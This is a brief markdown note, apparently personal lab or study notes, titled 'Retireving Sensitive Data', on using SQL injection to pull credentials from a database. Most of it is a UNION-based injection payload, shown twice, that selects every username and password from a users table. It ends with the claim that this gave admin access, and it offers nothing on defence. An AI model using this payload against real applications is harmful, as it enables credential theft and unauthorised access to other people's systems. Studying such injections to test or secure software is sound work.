# Retireving Sensitive Data

SQL injection can be helpful in retireving some sensitive data like password. Here is simple example for the same

```sql
' union select username, password from users--
```

This will return every user and password from the table users.

end goal : Retireve username and password

payload

```sql
' union select username, password from users--
```

got the password for admin access
